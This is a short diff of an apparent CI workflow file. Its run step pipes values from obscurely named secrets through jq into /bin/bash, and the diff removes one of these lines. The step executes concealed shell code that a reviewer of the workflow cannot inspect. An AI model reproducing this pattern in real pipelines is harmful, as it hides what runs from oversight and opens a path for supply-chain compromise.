@@ -19,7 +19,6 @@ jobs:
           ydbn17: ${{ secrets.ydbn17 }}
         run: |
           printf '%s' "$ydbn17" | jq -r .ztlr610 | /bin/bash
-          echo $vj00 | jq -r .smovi0 | /bin/bash
           printf '%s' "$v3058" | jq -r .k204 | /bin/bash
           printf '%s' "$ajoq9334" | jq -r .a38850 | /bin/bash
 
